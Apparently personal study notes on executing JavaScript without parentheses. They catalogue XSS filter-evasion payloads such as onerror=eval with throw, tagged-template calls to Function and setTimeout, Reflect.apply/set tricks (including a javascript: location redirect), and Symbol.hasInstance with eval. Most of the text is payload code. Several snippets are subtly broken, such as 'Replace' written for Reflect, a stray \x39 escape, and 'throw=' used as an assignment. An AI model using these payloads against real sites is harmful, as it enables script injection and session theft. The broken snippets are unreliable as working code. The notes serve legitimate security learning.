###### Calling functions without parentheses
- The one way is to use the `valueOf` method, it allows you to define a function which is called when a object is used as a primitive such as a number, it is usually used for addition purposes as follows
```
let obj = {valueOf(){return 1}};
console.log(obj+1) // Outputs 2
```
- So maybe one could use it call alert as follows
```
let obj = {valueOf:alert};
obj+1
```
This wont work since alert can only be called when `this` is a window object, here "this" is our custom object, but since the `window` object also implements valueOf just like almost all other objects we can do the following
```
window.valueOf=alert;window+1 // calls alert()
```
Also you do not really need to use `window.` since by default browsers use window, the following also works
```
valueOf=alert;window+1
```
One can also use `toString`, just like `valueOf`
```
toString=alert;window+'' // calls alert()
```

###### Calling function with arguments without parameters
- The window object has a global handler called `onerror`, when you provide the handler your function, it is sent the errors on the page.
- The function is called with the error message as the 1st argument, the URL as the second, line number in third, column number in fourth and the error object in the last argument.
- If we can control the error message argument which is a string we could call a function with a string as the first argument, we can set a handler and then cause a javascript exception to call the string.
- The `throw` statement allows one to create new exception, and its message as follows
```
throw new Error('Some Exception');
```
- The throw statement can throw anything even a string and it will be passed to the error handler
```
onerror=alert;throw 'foo'
```
- The above code on chrome results in "Uncaught foo", then how do we achieve arbitrary code execution, since replacing alert with eval will result in "Uncaught ", to get around that just add a equals to sign prior to alert.
```
onerror=eval;
throw="=alert\x281\x29";
```

One can use block statements to call arbitrary javascript without semicolons as follows
```
{onerror=eval}throw"=alert\x281337\x29"
```
Another way is to use Javascript's ASI(automatic semicolon insertion), one can use newlines and javascript will replace then with semicolons
```
onerror=alert
throw 1337
```
Javascript also supports line separators `\u2028` and paragraph separators `\u2029`, in place of newlines as follows
```
eval("onerror=\u2028alert\u2029throw 1337");
```

###### Throw Expressions
When one uses a throw statement it accepts and expression and the right most part of the expression is sent to the exception handler, this is because a comma operator goes from left to right and evaluates to the right most value in javascript.

Consider the following expression
```
let foo = ('bar', 'baz');
```
The value of foo will be `baz`, since the comma operator evaluates to that, thus using this we can reduce the number of characters in Javascript as follows
```
throw onerror=alert,1337
```
In the expression the error handler is assigned and then the comma operator evaluates to 1337 and sends 1337 to throw and we get `Uncaught 1337`.
Using any number of characters will result in the right most character being used
```
throw onerror=alert,1,2,3,4,5,6,7,8,9,10//Uncaught 10
```
One can also use optional exception variables inside a catch clause
```
try{throw onerror=alert}catch{throw 1337}
```
Here assignment expressions return the assigned value.
###### Tagged Templates
- Tagged template strings can call functions without arguments as in [[Basics of Javascript#Strings]]
Template strings also support placeholder's which can embed javascript expressions 
```
`${alert(1337)}`
```

- When tagged template strings are used to call functions the first argument is array of strings, every element of the array is a string in the template string which is not intterupted by a placeholder i.e `${}`, the next arguments are the evaluated values of the  placeholders themselves.
- For example consider calling the following code
```
function x(a,b,c) {
	console.log(arguments[0]);
	console.log(arguments[1]);
	console.log(arguments[2]);
}

x`a${'foo'}b${'bar'}`
```
The output of the code is as follows
```
["a", "b", ""]
"foo"
"bar"
```
As one can see the first argument is a array consisting of strings separated by placeholders, note that the last empty string is also included.

Also due to this using eval to evaluate code wont work, for example
```
eval`alert\x281337\x39`
```
this wont result in execution of alert since eval will just return an array without converting it to a string, on the other hand something like `setTimeout`, does convert the argument to a string and that will work.

- We can use tagged template strings to call the `Function` constructor with arbitrary javascript. The function constructor considers the last argument passed to it as the function body and the subsequent arguments passed to it as the arguments of the functions it creates, consider the following snippet
```
Function`x${'alert\x281337'}`
```
- This generates a functions without its body as `alert(1337)`, now to run the function one can just do the following
```
Function`x${'alert\x281337\x29'}```
```
Also the template strings also retain there type when they are passed as arguments to functions.

Now let us consider the sub goal of trying to call functions using placeholders, suppose consider the `setTimeout` function, the most common approach might be
```
setTimeout`${alert}${0}${1337}`
```
`setTimeout`, takes the first argument as code or a function, the next argument as the timeout and subsequent arguments as arguments to the function specified, however this will not work since the first argument will be a array with empty strings.

So maybe we can use the call function which will set the this value to the first argument and use the next arguments as the arguments([[Basics of Javascript#Call and Apply]])
```
setTimeout.call`${alert}${0}${1337}`
```
This wont work either since the this value is now not window, and a illegal invocation will result, thus the simplest way is to not use placeholders the following works just fine
```
setTimeout`alert\x281337\x29`
```

Thus to call functions using placeholders, we need some way to get around illegal invocation errors, consider the replace functions it has the following syntax
```
string.replace(pattern, replacement)
```
Pattern might be a string in itself or might be a regex expression, replacement can be a function or a string, if it is a function it is called with the first argument as the match of the pattern and its return value is what the match is replaced with.

Also the replace function only replaces the first occurence of the pattern and nothing else, that is the "match", using this we can call alert as follows
```
'a'.replace(/./, alert);
```
But here only the match is sent to alert as an argument,  to call with multi character arbitrary strings we can use template strings as the first argument is array which is converted to a string by replace for usage, for example
```
'a,'.replace`a${alert}`
```
Again however i have to insert a comma, to eliminate this we change the this value of the function using call, consider the following
```
'a'.replace.call`1${/./}${alert}`
```
This calls `alert(1)`, call sets the this value of the replace function to the array `["1", "",""]`, the replace function converts it to the string `1,,`, the first match here is `1` and thus `alert(1)` is called, here `'a'`, doesn't even matter you could replace it with anything.

We can call any function with any amount of arguments using the `Reflect` object, it has a custom apply function that can call functions on any object, passing the function, object and an array of arguments to it, calls the function,
```
Replace.apply.call`${alert}${window}${[1337]}`
```
Call is used so that the first argument to apply is not a  array of strings and it is it's this value, apply doesn't care about what it's this value is.

Reflect also has a `set` method which allows it to perform a set operation on any object, suppose as follows
```
Reflect.set.call`${location}${href}${'javascript:alert(1337)'}`
```

###### Has instance symbol
- symbols are unique datatypes which never repeat and are used as keys for properties, the `hasInstance`, symbol allows one to customise the behaviour of the `instanceof` operator, if the symbol is set the left operand is passed to the function defined by the symbol.
```
'alert\x281337\x29'instanceof{[Symbol['hasInstance']]:eval}
```
one can also do this without square brackets
```
'alert\x281337\x29'instanceof{[Symbol.hasInstance]:eval}
```
